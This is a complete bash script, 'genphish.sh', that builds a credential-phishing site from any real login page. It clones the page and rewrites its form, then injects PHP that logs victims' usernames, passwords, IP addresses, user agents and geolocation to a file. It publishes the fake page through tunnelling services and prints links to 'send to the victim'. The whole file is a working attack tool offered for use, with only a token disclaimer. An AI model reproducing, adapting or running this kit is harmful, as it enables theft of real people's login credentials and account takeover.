#!/bin/bash
#coding:utf-8
#title:genphish.sh
#author:hacknonym
#launch:./genphish.sh   |or|   bash genphish.sh   |or|   . genphish.sh

#terminal text color code
cyan='\e[0;36m'
purple='\e[0;7;35m'
purpleb='\e[0;7;35;1m'
orange='\e[38;5;166m'
orangeb='\e[38;5;166;1m'
white='\e[0;37;1m'
grey='\e[0;37m'
green='\e[0;32m'
greenb='\e[0;32;1m'
greenh='\e[0;42;1m'
red='\e[0;31m'
redb='\e[0;31;1m'
redh='\e[0;41;1m'
redhf='\e[0;41;5;1m'
yellow='\e[0;33m'
yellowb='\e[0;33;1m'
yellowh='\e[0;43;1m'
blue='\e[0;34m'
blueb='\e[0;34;1m'
blueh='\e[0;44;1m'

MAIN_PATH=$(pwd)
VERSION="1.0"

trap kill_quit INT

function user_privs(){
	if [ $EUID = 0 ] ; then 
  		echo -n
  	else
  		echo -e "[x] You don't have root privileges"
  		exit 1
	fi
}

function shortcut(){
	command -v genphish 1> /dev/null 2>&1 || { 
		read -p "[?] Do you want to create a shortcut for genphish in your system (Y/n)> " -n 1 -e option
		if [[ "$option" =~ ^[YyOo]$ ]] ; then
			#echo -e "alias genphish=\"cd $MAIN_PATH && ./genphish.sh\"" >> ~/.bashrc
			rm -f /usr/local/sbin/genphish
			touch /usr/local/sbin/genphish
			echo "#!/bin/bash" > /usr/local/sbin/genphish
			echo "cd $MAIN_PATH && ./genphish.sh \$1 \$2 \$3" >> /usr/local/sbin/genphish
			cp "$MAIN_PATH/config/GenPhish.desktop" /usr/share/applications/GenPhish.desktop
			cp "$MAIN_PATH/icons/GenPhish.ico" /usr/share/icons/GenPhish.ico
			sudo chmod +x /usr/local/sbin/genphish
			echo -e "[+] Used the shortcut$yellow genphish$grey"
		fi
	}
}

function internet(){
	ping -c 1 8.8.4.4 1> /dev/null 2>&1 || { 
		echo -e "[x] No Internet connection"
		return 2
	}
}

function verify_prog(){
    command -v $1 1> /dev/null 2>&1 || { 
    	echo -e "$grey[x] $1$yellow not installed$grey"
    	#read -p "Push ENTER to install" enter
    	echo -ne "[+] Installation of $yellow$1$grey in progress..."
    	sudo apt-get install -y $1 1> /dev/null
    	echo -e "$green OK$grey"
    }
}

function setup(){
	user_privs
	shortcut
	internet
	if [ $? = "2" ] ; then
		exit 1
	else
		echo -e "[+] Install Dependencies of GenPhish..."
		echo -ne "[+] Update cache..."
		sudo apt-get update 1> /dev/null 2>&1
		echo -e "$green OK$grey"
		verify_prog "php"
		verify_prog "wget"
		verify_prog "httrack"
		verify_prog "gedit"
		verify_prog "xterm"
		verify_prog "netstat"
		verify_prog "unzip"
		verify_prog "httping"
		verify_prog "jq" #PHP part
		verify_prog "git"
	fi
}

function download_site(){
	user_privs
	internet
	url=$1
	mainFile="index.html"
	echo -e "[+] Download $yellow$url$grey in progress..."
	domainRep=$(echo -e "$url" | cut -d '/' -f 3)
	mkdir $domainRep
	cd $domainRep
	website_path=$(pwd)
	wget --user-agent="Mozilla" $1 -O $mainFile 1> /dev/null 2>&1
	#wget -U Mozilla $1 -O $mainFile 1> /dev/null 2>&1
	#wget --header="Accept: text/html" --user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0" $1 -O $mainFile 1> /dev/null 2>&1
}

function download_all_site(){
	user_privs
	internet
	url=$1
	echo -e "[+] Download files from $yellow$url$grey in progress..."
	
#######HTTRACK
	httrack $url 1> /dev/null
	domainRep=$(echo -e "$1" | cut -d '/' -f 3)
	mainFile=$(for i in $(for i in $(cat index.html | grep -e "$domainRep") ; do echo -e "$i" | cut -d '"' -f 2 ; done | grep -e "$domainRep" | sed -n '1 p' | tr '/' ' ') ; do echo -e "$i" ; done | tail -1)
	rm index.html backblue.gif fade.gif hts-log.txt cookies.txt 1> /dev/null 2>&1
	rm -r hts-cache/ 1> /dev/null 2>&1

#######WGET
	#domainRep=$(echo -e "$1" | cut -d '/' -f 3)
	#wget -r $url 1> /dev/null 2>&1
	#mainFile=$(for i in $(echo -e "$url" | tr '/' ' ') ; do echo -e "$i" ; done | tail -1)

	cd $domainRep
	for i in $(echo -e "$url" | cut -d '/' -f 4-100 | tr '/' ' ') ; do 
		cd $i 1> /dev/null 2>&1
	done
	website_path=$(pwd)
}

function loopback_server(){
	default_port="41586"
	echo -ne "[?] Port of PHP Server default($yellow$default_port$grey)"
	read -p " > " port
	port="${port:-${default_port}}"
	fuser -k $port/tcp 1> /dev/null 2>&1
	echo -e "[+] Starting PHP Server..."
	cd $website_path
	php -S 127.0.0.1:$port 1> /dev/null 2>&1 &
	echo -e "[i] Loopback link(overview):$yellowb http://127.0.0.1:$port/$mainFile$grey"
}

function display_variables(){
	echo -e "Field 1 - Username/E-mail > $yellow$userFormFound$grey"
	echo -e "Field 2 - Password > $yellow$passFormFound$grey"
	echo -e "Field 3 - Submit > $yellow$submitFormFound$grey"
}

function verify_html(){
	#action=""
	actionForm=$(for i in $(cat $mainFile | grep -e "action=") ; do echo $i; done | grep -e "action=" | cut -d '"' -f 2)
	if [ "$actionForm" = "#" -o "$actionForm" = "" ] ; then
		echo -n
	else
		touch temp.sh && sudo chmod +x temp.sh
		echo -e """
#!/bin/bash
sed 's+$actionForm+'#'+g' $mainFile > $mainFile.temp
mv $mainFile.temp $mainFile""" >> temp.sh
		./temp.sh && rm -f temp.sh
	fi
	
	#onsubmit=""
	if cat $mainFile | grep -e "onsubmit=" 1> /dev/null ; then 
		onsubmitForm=$(for i in $(cat $mainFile | grep -e "onsubmit=") ; do echo $i; done | grep -e "onsubmit=" | cut -d '"' -f 2)

		if [ "$onsubmitForm" != "" ] ; then
			touch temp.sh && sudo chmod +x temp.sh
			echo -e """
#!/bin/bash
sed 's+$onsubmitForm+''+g' $mainFile > $mainFile.temp
mv $mainFile.temp $mainFile""" >> temp.sh
			./temp.sh && rm -f temp.sh
		fi
	fi

	#<button> id=""
	if cat $mainFile | grep -e "<button" | grep -e "type=\"submit\"" 1> /dev/null ; then
		idbutton=$(for i in $(cat $mainFile | grep -e "<button" | grep -e "type=\"submit\"" | grep -v "hidden") ; do echo -e "$i"; done | grep -e "id=" | cut -d '"' -f 2)
		
		if [ "$idbutton" != "" ] ; then
			countId=$(for i in $(echo $idbutton) ; do echo -e "$i" ; done | grep -c "")

			if [ "$countId" = "1" ] ; then
				touch temp.sh && sudo chmod +x temp.sh
				echo -e """
#!/bin/bash
sed 's+$idbutton+''+g' $mainFile > $mainFile.temp
mv $mainFile.temp $mainFile""" >> temp.sh
				./temp.sh && rm -f temp.sh
			else # if the number of parameter id=".." > 1
				line=$(cat $mainFile | grep -n "<button" | grep -e "type=\"submit\"" | grep -v "hidden" | cut -d ':' -f 1)
				echo -e "[x] The element$yellow id=\"...\"$grey was$yellow found$grey in the <button..> of submit"
				echo -e "[i] Remove$yellow id=\"..\"$grey inside $yellow$website_path/$mainFile$grey at the line $yellow$line$grey"
				gedit $website_path/$mainFile &
				read -p "Push ENTER to continu" enter
			fi
		else # Try without hidden paramater filter (in case of Facebook where all is inline)
			idbutton=$(for i in $(cat $mainFile | grep -e "<button" | grep -e "type=\"submit\"") ; do echo -e "$i"; done | grep -e "id=" | cut -d '"' -f 2)
			
			if [ "$idbutton" != "" ] ; then
				line=$(cat $mainFile | grep -n "<button" | grep -e "type=\"submit\"" | cut -d ':' -f 1)
				echo -e "[i]$yellow id=\"..\"$grey may be present in the <button..> of submit, remove-it if it exists, verify line(s) $yellow$line$grey inside $yellow$website_path/$mainFile$grey"
				gedit $website_path/$mainFile &
				read -p "Push ENTER to continu" enter
			fi
		fi
	fi
}

function retrieve_variables(){
	echo -e """
Search variable's name used for identification fields
  1 - Automatically
  2 - Only Manually"""

	read -p "> " -n 2 -e option

	case $option in

	1 | 01 )
		userTest=$(for i in $(cat $mainFile | grep -e 'type="text"' | grep -v "hidden") ; do echo $i; done | grep -e "name=" | cut -d '"' -f 2)
		if [ ! -z "$userTest" ] ; then
			userFormFound=$userTest
		else
			echo -e "[x]$yellow Username$grey variable was$yellow not found automatically$grey (If don't exist, leave empty)"
			read -p "[?] Username/E-mail > " userFormFound

			if [ -z "$userFormFound" ] ; then
				line=$(cat $mainFile | grep -n 'type="text"' | grep -v "hidden" | cut -d ':' -f 1)
				echo -e "[i] Add$yellow name=\"username\"$grey just after$yellow type\"text\"$grey inside $yellow$website_path/$mainFile$grey at the line $yellow$line$grey"
				gedit $website_path/$mainFile &
				read -p "Push ENTER to continu" enter
				userFormFound="username"
			fi
		fi

		passTest=$(for i in $(cat $mainFile | grep -e 'type="password"' | grep -v "hidden") ; do echo $i; done | grep -e "name=" | cut -d '"' -f 2)
		if [ ! -z "$passTest" ] ; then
			passFormFound=$passTest
		else
			echo -e "[x]$yellow Password$grey variable was$yellow not found automatically$grey (If don't exist, leave empty)"
			read -p "[?] Password > " passFormFound

			if [ -z "$passFormFound" ] ; then
				line=$(cat $mainFile | grep -n 'type="password"' | grep -v "hidden" | cut -d ':' -f 1)
				echo -e "[i] Add$yellow name=\"password\"$grey just after$yellow type\"password\"$grey inside $yellow$website_path/$mainFile$grey at the line $yellow$line$grey"
				gedit $website_path/$mainFile &
				read -p "Push ENTER to continu" enter
				passFormFound="password"
			fi
		fi

		submTest=$(for i in $(cat $mainFile | grep -e 'type="submit"' | grep -v "hidden") ; do echo $i; done | grep -e "name=" | cut -d '"' -f 2)
		if [ ! -z "$submTest" ] ; then
			submitFormFound=$submTest
		else
			echo -e "[x]$yellow Submit$grey variable was$yellow not found automatically$grey (If don't exist, leave empty)"
			read -p "[?] Submit > " submitFormFound

			if [ -z "$submitFormFound" ] ; then
				line=$(cat $mainFile | grep -n 'type="submit"' | grep -v "hidden" | cut -d ':' -f 1)
				echo -e "[i] Add$yellow name=\"submit\"$grey just after$yellow type\"submit\"$grey inside $yellow$website_path/$mainFile$grey at the line $yellow$line$grey"
				gedit $website_path/$mainFile &
				read -p "Push ENTER to continu" enter
				submitFormFound="submit"
			fi
		fi

		display_variables

		read -p "[?] Do you want to modify another field ? (Y/n)> " -n 1 -e modify
		if [[ "$modify" =~ ^[YyOo]$ ]] ; then modify_variables ; else php_header ; fi;;

	2 | 02 )
		echo -e "[+] Specify the variable's name in the form e.g. name=\"email\" -> $yellow email$grey"
		echo -e "[i] If they don't exist, leave empty"

		read -p "[?] Field 1 - Username/E-mail > " userFormFound
		if [ -z "$userFormFound" ] ; then
			line=$(cat $mainFile | grep -n 'type="text"' | grep -v "hidden" | cut -d ':' -f 1)
			echo -e "[i] Add$yellow name=\"username\"$grey just after$yellow type\"text\"$grey inside $yellow$website_path/$mainFile$grey at the line $yellow$line$grey"
			gedit $website_path/$mainFile &
			read -p "Push ENTER to continu" enter
			userFormFound="username"
		fi
		read -p "[?] Field 2 - Password > " passFormFound
		if [ -z "$passFormFound" ] ; then
			line=$(cat $mainFiln | grep -n 'type="password"' | grep -v "hidden" | cut -d ':' -f 1)
			echo -e "[i] Add$yellow name=\"password\"$grey just after$yellow type\"password\"$grey inside $yellow$website_path/$mainFile$grey at the line $yellow$line$grey"
			read -p "Push ENTER to continu" enter
			passFormFound="password"
		fi
		read -p "[?] Field 3 - Submit > " submitFormFound
		if [ -z "$submitFormFound" ] ; then
			line=$(cat $mainFile  | grep -n 'type="submit"' | grep -v "hidden" | cut -d ':' -f 1)
			echo -e "[i] Add$yellow name=\"submit\"$grey just after$yellow type\"submit\"$grey inside $yellow$website_path/$mainFile$grey at the line $yellow$line$grey"
			gedit $website_path/$mainFile &
			read -p "Push ENTER to continu" enter
			submitFormFound="submit"
		fi

		display_variables

		read -p "[?] Do you want to modify another field ? (Y/n)> " -n 1 -e modify
		if [[ "$modify" =~ ^[YyOo]$ ]] ; then modify_variables ; else php_header ; fi;;

	* ) 
		echo -e "Error Syntax" && sleep 1
		retrieve_variables;;

	esac
}

function modify_variables(){
	echo -e """
Select variable you want to modify
  1 - $yellow$userFormFound$grey
  2 - $yellow$passFormFound$grey
  3 - $yellow$submitFormFound$grey
  9 - back"""

	read -p "> " -n 2 -e option

	case $option in
	1 | 01 ) 
		echo -e "[i] If they don't exist, leave empty"
		read -p "[?] Field 1 - Username/E-mail > " userFormFound
		if [ -z "$userFormFound" ] ; then
			line=$(cat $mainFile | grep -n 'type="text"' | grep -v "hidden" | cut -d ':' -f 1)
			echo -e "[i] Add$yellow name=\"username\"$grey just after$yellow type\"text\"$grey inside $yellow$website_path/$mainFile$grey at the line $yellow$line$grey"
			gedit $website_path/$mainFile &
			read -p "Push ENTER to continu" enter
			userFormFound="username"
		fi
		display_variables

		read -p "[?] Do you want to modify another field ? (Y/n)> " -n 1 -e modify
		if [[ "$modify" =~ ^[YyOo]$ ]] ; then modify_variables ; else php_header ; fi;;

	2 | 02 ) 
		echo -e "[i] If they don't exist, leave empty"
		read -p "[?] Field 2 - Password > " passFormFound
		if [ -z "$passFormFound" ] ; then
			line=$(cat $mainFiln | grep -n 'type="password"' | grep -v "hidden" | cut -d ':' -f 1)
			echo -e "[i] Add$yellow name=\"password\"$grey just after$yellow type\"password\"$grey inside $yellow$website_path/$mainFile$grey at the line $yellow$line$grey"
			read -p "Push ENTER to continu" enter
			passFormFound="password"
		fi
		display_variables

		read -p "[?] Do you want to modify another field ? (Y/n)> " -n 1 -e modify
		if [[ "$modify" =~ ^[YyOo]$ ]] ; then modify_variables ; else php_header ; fi;;

	3 | 03 )
		echo -e "[i] If they don't exist, leave empty"
		read -p "[?] Field 3 - Submit > " submitFormFound
		if [ -z "$submitFormFound" ] ; then
			line=$(cat $mainFile  | grep -n 'type="submit"' | grep -v "hidden" | cut -d ':' -f 1)
			echo -e "[i] Add$yellow name=\"submit\"$grey just after$yellow type\"submit\"$grey inside $yellow$website_path/$mainFile$grey at the line $yellow$line$grey"
			gedit $website_path/$mainFile &
			read -p "Push ENTER to continu" enter
			submitFormFound="submit"
		fi
		display_variables

		read -p "[?] Do you want to modify another field ? (Y/n)> " -n 1 -e modify
		if [[ "$modify" =~ ^[YyOo]$ ]] ; then modify_variables ; else php_header ; fi;;

	9 | 09 ) php_header;;

	* ) 
		echo -e "Error Syntax" && sleep 1
		modify_variables;;

	esac
}

function php_header(){

	default_url_redirect=$url
	echo -ne "[?] Specify an URL redirection after the victim sign-in default($yellow$url$grey)"
	read -p " > " url_redirect
	url_redirect="${url_redirect:-${default_url_redirect}}"

	echo -e """
<?php
session_start();

function get_ip(){
\tif(isset(\$_SERVER['HTTP_X_FORWARDED_FOR'])) { \$ip = \$_SERVER['HTTP_X_FORWARDED_FOR']; }
\telseif(isset(\$_SERVER['HTTP_CLIENT_IP'])) { \$ip  = \$_SERVER['HTTP_CLIENT_IP']; }
\telse { \$ip = \$_SERVER['REMOTE_ADDR']; }
\treturn \$ip;
}

if(isset(\$_POST['$submitFormFound'])){
\t\$user = htmlspecialchars(\$_POST['$userFormFound']);
\t\$pass = htmlspecialchars(\$_POST['$passFormFound']);
\t\$ip = get_ip();
\t\$current_date = strftime('%A %m/%d/%y %H:%M:%S'); #format month/day/year
\t\$geolocation = shell_exec(\"curl -s ipinfo.io/\$ip?token=\$TOKEN | jq -r '[.ip, .country, .region, .city, .timezone, .org] | join(\\\"|\\\")'\");

\t\$file = fopen(\"$MAIN_PATH/ident.txt\", \"a+\");
\tfwrite(\$file, \"\$current_date|\");
\tfwrite(\$file, \"$domainRep|\");
\tfwrite(\$file, \"\$user|\");
\tfwrite(\$file, \"\$pass|\");
\tfwrite(\$file, \$_SERVER['HTTP_USER_AGENT'].\"|\");
\tfwrite(\$file, \"\$geolocation\");

\theader(\"Location: $url_redirect\");
}
?>""" > index.php

	cat $mainFile >> index.php
	rm $mainFile

	echo -e "[+] Create log file $yellow$MAIN_PATH/ident.txt$grey"
	touch $MAIN_PATH/ident.txt
	sudo chmod +rw $MAIN_PATH/ident.txt
}

function display_log(){
	echo -e """
How to display Log
  1 - Terminal (xterm)
  2 - GUI (website)"""

	read -p "> " -n 2 -e option

	case $option in
	1 | 01 )
		xterm -fa monaco -fs 12 -T "Output Credentials Informations" -geometry "80x24" -bg black -fg white -e "cd $MAIN_PATH && sh log_script.sh" &;;

	2 | 02 )
		cd $MAIN_PATH
		default_port_log_website="41585"
		echo -ne "[?] Port of Website log Server default($yellow$default_port_log_website$grey)"
		read -p " > " port_log_website
		port_log_website="${port_log_website:-${default_port_log_website}}"
		fuser -k $port_log_website/tcp 1> /dev/null 2>&1
		php -S 127.0.0.1:$port_log_website 1> /dev/null 2>&1 &
		echo -e "[+] Log link:$yellowb http://127.0.0.1:$port_log_website/log_website.php$grey"
		firefox "http://127.0.0.1:$port_log_website/log_website.php" & 1> /dev/null 2>&1;;

	* ) 
		echo -e "Error Syntax" && sleep 1
		display_log;;

	esac
}

function relays(){
	echo -e """$grey
Choose the HTTP(S) Relay$grey
  1 x serveo.net
  2 - ssh.localhost.run
  3 - openport
  4 x Localtunnel$yellow choose subdomain$grey
  5 - LocalXpose$yellow choose subdomain$grey
  6 - Pagekite$yellow choose subdomain$grey
  7 - Ngrok
  9 - Quit GenPhish"""

	read -p "> " -n 2 -e option

	case $option in

	1 | 01 )
	    echo -e "[+] Starting SSH Tunneling..."
	    #ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:$port serveo.net 2> /dev/null > sendlink.txt &
	    #sleep 10
	    #send_link=$(cat sendlink.txt | grep -o "https://[0-9a-z]*\.serveo.net")
	    echo -e "[+] Send this link to the Victim:$yellowb $send_link$grey";;

	2 | 02 )
		echo -e "[+] Starting SSH Tunneling..."
	    #ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:$port ssh.localhost.run 2> /dev/null > sendlink.txt &
	    #sleep 10
	    #send_link=$(cat sendlink.txt | cut -d ' ' -f 5)
	    #send_link=$(cat sendlink.txt | grep -o "https://root-[0-9a-z]*\.localhost.run")
	    #echo -e "[+] Send this link to the Victim:$yellowb $send_link$grey"
	    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:$port ssh.localhost.run;;

	3 | 03 )
		cd $MAIN_PATH/relays/
		command -v openport 1> /dev/null 2>&1 || { 
	    	echo -e "[+] Installation of$yellow openport$grey in progress..."
	    	sudo dpkg -i openport_*.deb 1> /dev/null
    	}
		
		echo -e "[+] Starting SSH Tunneling..."
	    openport -K
	    openport --local-port $port --http-forward --ip-link-protection True > sendlink.txt 2> /dev/null &
	    sleep 10
	    send_link=$((cat sendlink.txt | grep -e "https://www.openport.io/" | cut -d ' ' -f 14) | cut -d '=' -f 2)
	    echo -e "[+] Send this link to the Victim:$yellowb $send_link$grey";;

	4 | 04 )
		command -v lt 1> /dev/null 2>&1 || { 
		    echo -e "[+] Installation of$yellow Localtunnel$grey in progress..."
		   	npm install -g localtunnel 1> /dev/null
		   	npm install -g npm 1> /dev/null
	    }

	    default_subdomain=$domainRep
	    echo -ne "[?] Choose Subdomain default($yellow$domainRep$grey)"
	    read -p " > " subdomain
	    subdomain="${subdomain:-${default_subdomain}}"
	    echo -e "[+] Connection Localtunnel Server..."
	    lt -l 127.0.0.1 -s $subdomain -p $port > sendlink.txt 2> /dev/null &
	    sleep 10
	    send_link=$(cat sendlink.txt | cut -d ' ' -f 4)
	    echo -e "[+] Send this link to the Victim:$yellowb $send_link$grey";;

	5 | 05 )
		default_subdomain=$domainRep
	    echo -ne "[?] Choose Subdomain default($yellow$domainRep$grey)"
	    read -p " > " subdomain
	    subdomain="${subdomain:-${default_subdomain}}"

	    echo -e "[+] Connection LocalXpose Server..."
	    cd $MAIN_PATH/relays/
	    ./loclx-linux-amd64 update
	    ./loclx-linux-amd64 tunnel http --to 127.0.0.1:$port --subdomain $subdomain > sendlink.txt 2> /dev/null &
	    sleep 10
	    send_link=$(cat sendlink.txt | grep -e "https" | cut -d ' ' -f 2)
	    echo -e "[+] Send this link to the Victim:$yellowb $send_link$grey";;

	6 | 06 )
		default_subdomain=$domainRep
	    echo -ne "[?] Choose Subdomain default($yellow$domainRep$grey)"
	    read -p " > " subdomain
	    subdomain="${subdomain:-${default_subdomain}}"
	    echo -e "[+] Connection PageKite Server..."
	    cd $MAIN_PATH/relays/
	    python2 pagekite.py --clean --signup $port $subdomain.pagekite.me;; #> sendlink.txt 2> /dev/null &
	    #sleep 10
	    #send_link=$(cat sendlink.txt)
	    #echo -e "[+] Send this link to the Victim:$yellowb $send_link$grey";;

	7 | 07 )
		echo -e "[+] Connection Ngrok Server..."
    	cd $MAIN_PATH/relays/
    	./ngrok http $port 1> /dev/null 2>&1 &
	    sleep 5
	    for i in $(netstat -puntl | grep -e "LISTEN" | grep -e "ngrok" | awk '{print $4}' | cut -d ':' -f 2) ; do	
			if httping -c 1 http://127.0.0.1:$i 1> /dev/null ; then
				send_link=$(curl -s -N http://127.0.0.1:$i/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
	    		echo -e "[+] Send this link to the Victim:$yellowb $send_link$grey"
	    		read -p "Push ENTER to kill current process and quit GenPhish" enter
	    		ngrok_pid=$(netstat -puntl | grep -e "ngrok" | awk '{print $7}' | cut -d '/' -f 1)
	    		kill $ngrok_pid
	    		kill_quit
	    	fi
		done;;

	9 | 09 )
		read -p "Push ENTER to kill current process and quit GenPhish" enter
		kill_quit;;

	* ) 
		echo -e "Error Syntax" && sleep 1
		relays;;

	esac
}

function kill_quit(){
	echo
	if [ ! -z $port ] ; then
		echo -e "$grey[+] Stop tcp port $yellow$port$grey"
		fuser -k $port/tcp 1> /dev/null 2>&1 &
	fi
	if [ ! -z $port_log_website ] ; then
		echo -e "$grey[+] Stop tcp port $yellow$port_log_website$grey"
		fuser -k $port_log_website/tcp 1> /dev/null 2>&1 &
	fi
	cd $MAIN_PATH && rm -rf $domainRep
	cd $MAIN_PATH/relays/ && rm sendlink.txt 1> /dev/null 2>&1
	echo -e "[+] Quit GenPhish..."
	exit 1
}

function update(){
	internet
	if [ $? = "2" ] ; then
		exit 1
	else
		echo -e "[+] Update of GenPhish in progress..."
		echo -n "[+] Retrieve Repository..."
		cd $MAIN_PATH/
		git clone --quiet https://github.com/hacknonym/GenPhish.git
		cp -rf $MAIN_PATH/GenPhish/* $MAIN_PATH/ 1> /dev/null
		rm -rf GenPhish/
		sudo chmod +x genphish.sh log_script.sh 1> /dev/null
		echo -e "$green OK$grey"
		./genphish.sh --version
	fi
}

function help(){
	echo -e """Please do not use in military or secret service organizations, or for illegal purposes.
Github : https://github.com/hacknonym/GenPhish
Author : hacknonym

Usage : ./genphish.sh [[--url URL] [--all]]
Generate a phony phishing website from any real website.

  -u, --url        specify an URL
  -a, --all        download all site files recursively (httrack)
  -h, --help       show this help and ends
  -V, --version    show program version and ends
  -v, --viewlog    show log file
  -r, --rmlog      remove log file
      --setup      install GenPhish
      --update     update GenPhish

Examples:
  genphish -u https://website.com/login.php -a  (httrack)
  genphish -u https://website.com/login.php     (wget)"""
  exit 1
}

if [ "$1" = "-h" -o "$1" = "--help" ] ; then
	help
elif [ "$1" = "-V" -o "$1" = "--version" ] ; then
	echo -e "genphish - Version $VERSION"
	exit 1
elif [ "$1" = "-v" -o "$1" = "--viewlog" ] ; then
	echo -en "\033[1A" && display_log
	exit 1
elif [ "$1" = "-r" -o "$1" = "--rmlog" ] ; then
	rm -f $MAIN_PATH/ident.txt
	touch $MAIN_PATH/ident.txt
	echo -e "[+] The log have been deleted -> $yellow$MAIN_PATH/ident.txt$grey"
	exit 1
elif [ "$1" = "--update" ] ; then
	update && exit 1
elif [ "$1" = "--setup" ] ; then
	setup && exit 1
elif [ $# -ge 2 ] ; then
	if [ $1 = "--url" -o $1 = "-u" ] ; then
		if [ "$3" = "--all" -o "$3" = "-a" ] ; then
			download_all_site $2
		else
			download_site $2
		fi
	elif [ $1 = "--all" -o $1 = "-a" ] ; then
		if [ $2 = "--url" -o $2 = "-u" ] ; then
			if [ ! -z "$3" ] ; then 
				download_all_site $3
			else
				help
			fi
		else
			help
		fi
	else
		help
	fi
else
	help
fi

loopback_server
verify_html
retrieve_variables
display_log
#If not Internet relays can not work
if [ $? = "2" ] ; then
	exit 1
else
	relays
fi
read -p "Push ENTER to kill current process and quit GenPhish" enter
kill_quit
